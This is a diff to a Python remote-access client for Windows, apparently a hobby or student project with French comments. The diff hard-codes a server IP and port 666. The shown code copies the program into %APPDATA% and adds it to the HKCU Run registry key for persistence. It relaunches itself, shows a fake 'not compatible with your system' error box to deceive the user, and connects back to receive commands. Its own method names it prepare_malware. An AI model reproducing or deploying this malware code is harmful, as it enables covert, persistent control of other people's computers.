@@ -5,6 +5,7 @@ from platform import node
 from time import sleep
 from re import match
 import subprocess
+import sys
 import winreg
 import ctypes
 import argparse
@@ -22,14 +23,13 @@ except ModuleNotFoundError:
 
 class Client:
     def __init__(self):
-        """On initialise la class Client avec un socket / l'adresse du serveur ainsi que l'écoute qui est en True
+        """On initialise la class Client avec une l'ip du serveur, le port du serveur, un socket
+            ainsi que l'écoute qui est en True
         """
-        self.parser = argparse.ArgumentParser()
-        self.parser.add_argument("--address", "-a", type=str, required=True, help="Adresse IP de l'hôte")
-        self.parser.add_argument("--port", "-p", type=int, required=True, help="Port de l'hôte")
-        self.args = self.parser.parse_args()
-        self.ip = self.args.address
-        self.port = self.args.port
+        
+        self.ip = "192.168.1.52"
+        self.port = 666
+        
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.listening = True
         self.node = str(node())
@@ -47,19 +47,19 @@ class Client:
 
         try:
             self.path_appdata = os.path.expandvars('%APPDATA%')
-            client_name = os.path.basename(__file__)
-            current_full_path = os.path.abspath(__file__)
+            client_name = os.path.basename(sys.argv[0])
+            current_full_path = os.path.abspath(sys.argv[0])
             copyfile(current_full_path, self.path_appdata + "\\" + client_name)
             key = winreg.HKEY_CURRENT_USER
             key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
             open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
             winreg.SetValueEx(open_key, "client", 0, winreg.REG_SZ,
-                              self.path_appdata + "\\" + client_name + ' -a ' + self.ip + ' -p ' + str(self.port))
+                              self.path_appdata + "\\" + client_name)
             winreg.CloseKey(open_key)
 
             try:
                 os.chdir(self.path_appdata)
-                os.popen(client_name + ' -a ' + self.ip + ' -p ' + str(self.port))
+                os.popen(client_name)
                 ctypes.windll.user32.MessageBoxW(0, "This program is not compatible with your system.", "Error", 0x10)
             except WindowsError:
                 pass
@@ -77,14 +77,8 @@ class Client:
         """Fonction qui essaye de se connecter au serveur via l'adresse et le port défini plus haut
         Si aucun serveur n'écoute sur cette adresse et ce port, le client se ferme
         """
-        regex_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][" \
-                   "0-9]|25[0-5])$"
-        regex_port = "^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
         try:
-            if match(regex_ip, self.ip) and match(regex_port, str(self.port)):
-                self.s.connect((self.ip, self.port))
-            else:
-                self.listening = False
+            self.s.connect((self.ip, self.port))
         except ConnectionRefusedError:
             self.listening = False
 
@@ -358,3 +352,4 @@ client = Client()
 client.prepare_malware()
 client.connect_socket()
 client.listen_command()
+
